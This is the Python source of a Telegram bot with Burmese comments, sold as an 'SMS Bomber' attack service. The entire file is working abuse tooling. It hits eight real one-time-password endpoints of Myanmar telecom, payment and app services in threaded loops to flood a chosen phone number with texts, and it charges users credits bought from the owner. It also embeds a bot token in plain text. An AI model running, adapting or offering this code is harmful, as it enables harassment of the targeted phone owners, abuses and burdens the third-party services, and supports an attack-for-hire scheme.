import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import threading
import time

# Telegram Bot Token နှင့် Owner ID ထည့်ရန်
TOKEN = "8951902631:AAFsaVkQtAT3vmmBV2qbOasBYAV0iiqTujo"
bot = telebot.TeleBot(TOKEN)
OWNER_ID = 7936016365
OWNER_USERNAME = "@Obito27891"

# ဒေတာသိမ်းဆည်းရန် နေရာများ
user_data = {}
active_attacks = {}

# ပေးထားသော API စာရင်း (၈ ခု)
API_LIST = [
    { "id": "wave", "name": "🌊 WAVE", "endpoint": "https://api.wavemoney.io:8100/v3/wmt-mfs-otp/generate-otp", "method": "GET", "transform": lambda p: p },
    { "id": "mytel", "name": "📱 MYTEL", "endpoint": "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp", "method": "GET", "transform": lambda p: "959" + p[2:] },
    { "id": "atom", "name": "📡 ATOM", "endpoint": "https://store.atom.com.mm/mytmapi/v1/my/local-auth/send-otp", "method": "POST", "transform": lambda p: p, "body": lambda p: {"msisdn": p} },
    { "id": "mahar", "name": "🟣 MAHAR", "endpoint": "https://api.maharprod.com/sms/v1/movie/telenor/atom_sms", "method": "POST", "transform": lambda p: "959" + p[2:], "body": lambda p: {"phoneNumber": p} },
    { "id": "tay", "name": "🟤 TAY", "endpoint": "https://asia-southeast1-eb-ttt-prod-fbb6a.cloudfunctions.net/API5/users/login", "method": "POST", "transform": lambda p: "+959" + p[2:], "body": lambda p: {"phone_number": p} },
    { "id": "saya", "name": "📘 SAYA", "endpoint": "https://backend.saya.education/api/login", "method": "POST", "transform": lambda p: int("959" + p[2:]) },
    { "id": "shwe", "name": "🎬 SHWE", "endpoint": "https://api.shwestream.com/api/v1/auth/send-otp", "method": "POST", "transform": lambda p: "959" + p[2:], "body": lambda p: {"phone": p} },
    { "id": "akh", "name": "🎮 AKH", "endpoint": "https://akhgameshop.org/api/send-phone-otp", "method": "POST", "transform": lambda p: p, "body": lambda p: {"phone": p} }
]

def get_user(user_id):
    if user_id == OWNER_ID:
        return {"credit": "Unlimited"}
    
    if user_id not in user_data:
        user_data[user_id] = {
            "credit": 20  # အစစချင်း 20 စပေးမည်
        }
    return user_data[user_id]

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 SMS Attack စတင်ရန်", callback_data="start_attack"))
    markup.add(InlineKeyboardButton("⏹️ Attack ရပ်ရန်", callback_data="stop_attack"))
    markup.add(InlineKeyboardButton("💰 My Account & Credit", callback_data="my_account"))
    markup.add(InlineKeyboardButton("💳 Credit ဝယ်ယူရန်", url=f"https://t.me/Obito27891"))
    
    text = (
        f"👋 မင်္ဂလာပါ! SMS Bomber Bot မှ ကြိုဆိုပါတယ်။\n\n"
        f"💰 လက်ကျန် Credit: {user['credit']}\n"
        f"ℹ️ စည်းမျဉ်း: SMS ၁ စောင်လျှင် Credit ၁ ခု ဖြတ်မည်။\n"
        f"🛒 Credit ဝယ်ယူရန် {OWNER_USERNAME} သို့ ဆက်သွယ်ပါ။"
    )
    bot.reply_to(message, text, reply_markup=markup)

# Owner သီးသန့် Command: /credit user_id amount (မည်သူ့ကိုမဆို Credit ဖြည့်ပေးရန်)
@bot.message_handler(commands=['credit'])
def add_credit_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ ဤ Command သည် Owner အတွက်သာ ဖြစ်ပါသည်။")
        return
    
    try:
        parts = message.text.split()
        target_id = int(parts[1])
        amount = int(parts[2])
        
        if target_id not in user_data:
            user_data[target_id] = {"credit": 20}
            
        user_data[target_id]["credit"] += amount
        bot.reply_to(message, f"✅ User (`{target_id}`) သို့ Credit `{amount}` အောင်မြင်စွာ ဖြည့်ပေးလိုက်ပါပြီ။ လက်ကျန်: {user_data[target_id]['credit']}")
        bot.send_message(target_id, f"🎉 Owner မှ သင့်ထံသို့ Credit `+{amount}` ထည့်သွင်းပေးလိုက်ပါပြီ!")
    except Exception as e:
        bot.reply_to(message, "❌ ပုံစံ မှားယွင်းနေပါသည်။ ဥပမာ: `/credit 123456789 50` ဟု ရိုက်ပါ။")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    user_id = call.from_user.id
    user = get_user(user_id)

    if call.data == "my_account":
        bot.answer_callback_query(call.id, f"လက်ကျန် Credit: {user['credit']}", show_alert=True)

    elif call.data == "start_attack":
        if user_id != OWNER_ID and user["credit"] <= 0:
            bot.answer_callback_query(call.id, "❌ Credit မလုံလောက်ပါ။ Credit ထပ်ဝယ်ပါ။", show_alert=True)
            return
            
        # API ရွေးချယ်ရန် Menu ပြသခြင်း
        markup = InlineKeyboardMarkup()
        for api in API_LIST:
            markup.add(InlineKeyboardButton(api["name"], callback_data=f"api_{api['id']}"))
        markup.add(InlineKeyboardButton("⚡ ALL APIs (၈ ခုလုံး တခါတည်းပို့ရန်)", callback_data="api_all"))
        markup.add(InlineKeyboardButton("🔙 နောက်သို့", callback_data="back_home"))
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="🎯 **အသုံးပြုလိုသော API ကို ရွေးချယ်ပါ:**",
            reply_markup=markup
        )

    elif call.data.startswith("api_"):
        selected_api = call.data.split("_")[1]
        
        msg = bot.send_message(user_id, f"📱 ရွေးချယ်ထားသော API: `{selected_api.upper()}`\n\nဖုန်းနံပါတ်ကို ရိုက်ထည့်ပါ (ဥပမာ: `09971234567`):")
        bot.register_next_step_handler(msg, lambda m: process_phone_number(m, selected_api))

    elif call.data == "stop_attack":
        if user_id in active_attacks:
            active_attacks[user_id] = False
            bot.answer_callback_query(call.id, "🛑 SMS Attack ကို ရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        else:
            bot.answer_callback_query(call.id, "⚠️ လက်ရှိ လုပ်ဆောင်နေသော Attack မရှိပါ။", show_alert=True)

    elif call.data == "back_home":
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.message_id)
        bot.send_message(user_id, "ပင်မမီနူးသို့ ပြန်ရောက်ပါပြီ။ /start ကို နှိပ်ပါ။")

def process_phone_number(message, selected_api):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    msg = bot.send_message(user_id, "🔢 ပို့လိုသည့် အရေအတွက် (Count) ကို ရိုက်ထည့်ပါ (၁ စောင် = ၁ Credit):")
    bot.register_next_step_handler(msg, lambda m: process_count(m, phone, selected_api))

def process_count(message, phone, selected_api):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    try:
        count = int(message.text.strip())
    except ValueError:
        bot.reply_to(message, "❌ ဂဏန်းသာ မှန်ကန်စွာ ရိုက်ထည့်ပါ။ /start မှ အစက ပြန်စပါ။")
        return

    if user_id != OWNER_ID:
        if user["credit"] < count:
            bot.reply_to(message, f"❌ Credit မလုံလောက်ပါ။ (သင့်လက်ကျန်: {user['credit']} | လိုအပ်သည်: {count})")
            return

    bot.send_message(user_id, f"🚀 ဖုန်းနံပါတ် `{phone}` သို့ SMS `{count}` စောင် (`{selected_api.upper()}`) ပို့ခြင်းကို စတင်နေပါပြီ...")
    
    active_attacks[user_id] = True
    threading.Thread(target=run_sms_attack, args=(user_id, phone, count, selected_api)).start()

def run_sms_attack(user_id, phone, count, selected_api):
    user = get_user(user_id)
    success_count = 0
    
    for i in range(count):
        if user_id not in active_attacks or not active_attacks[user_id]:
            break
            
        if user_id != OWNER_ID:
            if user["credit"] > 0:
                user["credit"] -= 1
            else:
                bot.send_message(user_id, "❌ Credit ကုန်သွားသဖြင့် Attack ကို ရပ်လိုက်ပါပြီ။")
                break

        # ရွေးချယ်မှုအပေါ်မူတည်၍ API ပို့ခြင်း
        apis_to_use = API_LIST if selected_api == "all" else [api for api in API_LIST if api["id"] == selected_api]

        for api in apis_to_use:
            try:
                transformed_phone = api["transform"](phone)
                headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                
                if api["method"] == "GET":
                    url = f"{api['endpoint']}?phone={transformed_phone}"
                    requests.get(url, headers=headers, timeout=5)
                elif api["method"] == "POST":
                    body_data = api["body"](transformed_phone)
                    requests.post(api["endpoint"], json=body_data, headers=headers, timeout=5)
                
                success_count += 1
            except Exception:
                pass
                
        time.sleep(2)
        
    if user_id in active_attacks:
        del active_attacks[user_id]
        
    current_credit = user["credit"]
    bot.send_message(user_id, f"✅ SMS Attack ပြီးဆုံးပါပြီ။\n- ပို့ပြီးစီးမှု: {success_count} requests\n- လက်ကျန် Credit: {current_credit}")

if __name__ == "__main__":
    print("SMS Attack Bot စတင်အလုပ်လုပ်နေပါပြီ...")
    bot.remove_webhook()
    bot.infinity_polling()

